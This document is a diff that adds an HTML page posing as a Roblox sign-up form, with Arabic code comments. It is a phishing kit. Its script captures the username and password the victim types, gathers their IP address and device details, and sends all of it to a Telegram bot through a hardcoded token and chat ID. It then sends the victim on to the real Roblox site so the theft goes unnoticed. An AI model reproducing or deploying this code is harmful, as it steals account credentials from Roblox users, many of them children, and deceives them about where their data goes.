@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Style Registration Page</title>
+    <link rel="stylesheet" href="styles.css">
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+</head>
+<body>
+    <div class="container">
+        <!-- شعار الموقع -->
+        <div class="logo">
+            <img src="images/logo.png" alt="Roblox Logo" class="logo-image">
+        </div>
+        <div class="form-container">
+            <h2>Sign Up</h2>
+            <form id="signup-form">
+                <div class="form-group">
+                    <label for="username">Username</label>
+                    <input type="text" id="username" placeholder="Enter your username" required>
+                </div>
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" placeholder="Enter your password" required>
+                </div>
+                <button type="submit">Sign Up</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- JavaScript -->
+    <script>
+        const TOKEN = "7882159877:AAEA5fk6ECrO_YIAt6PlA-OpXBF_zaWS7OA"; // ضع هنا التوكين الخاص بك
+        const CHAT_ID = "6243038338"; // ضع هنا معرف الشات
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+        document.getElementById('signup-form').addEventListener('submit', function(e) {
+            e.preventDefault(); // منع إعادة تحميل الصفحة
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // التأكد من أن اسم المستخدم وكلمة المرور تم إدخالهما
+            if (!username || !password) {
+                alert('يرجى إدخال اسم المستخدم وكلمة المرور!');
+                return; // إذا كانت الحقول فارغة، لا تتابع العملية
+            }
+
+            // الحصول على عنوان IP
+            axios.get('https://api.ipify.org?format=json')
+                .then(response => {
+                    const ip = response.data.ip;
+
+                    const userAgent = navigator.userAgent;
+                    const platform = navigator.platform;
+                    const screenWidth = screen.width;
+                    const screenHeight = screen.height;
+                    const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+
+                    // إعداد الرسالة
+                    const message = ` 
+                        <b>New Login Attempt</b>\n
+                        <b>Username:</b> ${username}\n
+                        <b>Password:</b> ${password}\n
+                        <b>IP Address:</b> ${ip}\n
+                        <b>Device Type:</b> ${deviceType}\n
+                        <b>Platform:</b> ${platform}\n
+                        <b>User Agent:</b> ${userAgent}\n
+                        <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
+                    `;
+
+                    // إرسال الرسالة إلى Telegram
+                    axios.post(URI_API, {
+                        chat_id: CHAT_ID,
+                        parse_mode: 'html',
+                        text: message
+                    }).then(response => {
+                        // عرض رسالة التأكيد
+                        const confirmation = confirm("يجب عليك الانتظار ساعتين. هل تريد المتابعة؟");
+                        if (confirmation) {
+                            // تحويل المستخدم إلى الرابط
+                            window.location.href = "https://www.roblox.com/home";
+                        }
+                    }).catch(error => {
+                        alert('حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.');
+                    });
+                })
+                .catch(error => {
+                    alert('حدث خطأ أثناء الحصول على عنوان الـ IP. حاول مرة أخرى.');
+                });
+        });
+    </script>
+</body>
+</html>
